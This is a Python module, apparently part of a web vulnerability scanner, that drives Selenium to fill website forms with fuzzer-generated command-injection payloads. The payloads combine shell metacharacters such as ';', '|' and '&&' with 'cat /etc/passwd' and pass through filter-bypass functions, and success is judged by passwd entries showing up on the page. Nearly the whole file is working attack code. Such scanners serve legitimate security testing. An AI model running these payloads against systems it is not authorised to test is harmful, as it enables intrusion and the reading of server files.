import time
from urllib.parse import *
from fuzzingbook.WebFuzzer import *
from selenium.common import NoSuchElementException, NoAlertPresentException, TimeoutException
from selenium.webdriver.common.by import By
from .command_injection_bypass import *
import random
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC



def check_attackable(driver, url) -> bool:
    # WebDriver 초기화
    driver.get(url)
    try:
        # 페이지가 로드되기를 기다림
        input_elements_text = EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='text']"))
        WebDriverWait(driver, 10).until(input_elements_text)
    except TimeoutException:
        print("페이지 로드 타임아웃")
        return False

    # 모든 input 요소와 select 요소 검색
    input_elements_text = driver.find_elements(By.CSS_SELECTOR, "input[type='text']")
    input_elements_password = driver.find_elements(By.CSS_SELECTOR, "input[type='password']")
    textarea_elements = driver.find_elements(By.TAG_NAME, "textarea")
    select_elements = driver.find_elements(By.TAG_NAME, "select")

    # 화면에 표시된 input 요소 또는 select 요소가 있는지 확인
    for element in input_elements_text + input_elements_password + select_elements + textarea_elements:
        if element.is_displayed():
            return True

    return False


def submit_form(driver, form_details, url, value) -> dict:
    # command injection payload 전송 함수

    result = {"Vulnerability": "", "URL": "", "Method": "", "Payload": ""}  # 결과를 저장할 변수

    inputs = form_details["inputs"]

    # 공격 인자값 가져오기
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value

        input_name = input.get("name")
        input_value = input.get("value")

        if input_name and input_value:
            data[input_name] = input_value

    if data == {}:
        return result

    if form_details["method"] == "get":  # GET 방식으로 전송할 때
        target_url = urljoin(url, form_details["action"])
        driver.get(target_url + "?" + urllib.parse.urlencode(data))
        try:
            # 페이지가 로드되기를 기다림
            element_present = EC.presence_of_element_located((By.TAG_NAME, 'body'))
            WebDriverWait(driver, 10).until(element_present)
        except TimeoutException:
            print("페이지 로드 타임아웃")

        page_source: str = driver.page_source
        time.sleep(0.5)

        # command injection 공격이 성공했는지 확인 후 결과 반환
        # 성공 유무는 passwd 파일에 반드시 존재 하는 사용자인 'root', 'daemon', 'sys' 문자열이 페이지에 출력되었는지를 확인하여 판단
        if page_source.count('root') > 0 and page_source.count('daemon') > 0 and page_source.count('sys') > 0:
            result["Vulnerability"] = "Command Injection"
            result["URL"] = url
            result["Method"] = form_details["method"]
            result["Payload"] = data
    elif form_details["method"] == "post":  # POST 방식으로 전송할 때
        name, payload = next(iter(data.items()))
        submit_button = None
        if driver.current_url != url:
            driver.get(url)
            try:
                # 페이지가 로드되기를 기다림
                element_present = EC.presence_of_element_located((By.NAME, name))
                WebDriverWait(driver, 10).until(element_present)
            except TimeoutException:
                print("페이지 로드 타임아웃")

        elem = driver.find_element(By.NAME, name)
        elem.send_keys(payload)

        try:  # submit 버튼을 찾아서 클릭
            submit_button = driver.find_element(By.CSS_SELECTOR, 'input[type="submit"]')
        except NoSuchElementException:
            try:  # submit 버튼을 찾아서 클릭
                submit_button = driver.find_element(By.CSS_SELECTOR, 'button[type="button"]')
            except NoSuchElementException:
                print("해당 요소를 찾을 수 없습니다.")

        time.sleep(3)
        submit_button.click()

        try:
            # 알림 창 무시하고 진행
            alert = driver.switch_to.alert
            alert.dismiss()
        except NoAlertPresentException:
            # 알림 창이 이미 사라진 경우
            pass

        page_source: str = driver.page_source

        # command injection 공격이 성공 했는지 확인 후 결과 반환
        # 성공 유무는 passwd 파일에 반드시 존재 하는 사용자인 'root', 'daemon', 'sys' 문자열이 페이지에 출력되었는지를 확인하여 판단
        if page_source.count('root') > 0 and page_source.count('daemon') > 0 and page_source.count('sys') > 0:
            result["Vulnerability"] = "Command Injection"
            result["URL"] = url
            result["Method"] = form_details["method"]
            result["Payload"] = data

    return result


def generate_payload(count: int) -> list[str]:
    # command injection 페이로드 생성 함수

    payloads: list[str] = []
    bypass_functions: list[str] = get_bypass_func()

    Command_Injection_Grammar: Grammar = {
        '<start>': ['<command-injection>'],
        '<command-injection>': ['<meta-char><command><args>'],
        '<meta-char>': ['', ';', '|', '&', '&&', '||'],
        '<command>': ['cat'],
        '<args>': [' /etc/passwd']
    }

    command_injection_fuzzer = GrammarFuzzer(Command_Injection_Grammar)
    payloads = set()

    while len(payloads) < count:
        payload: str = command_injection_fuzzer.fuzz()
        payloads.add(random.choice(bypass_functions)(payload))

    payloads = list(payloads)

    return payloads
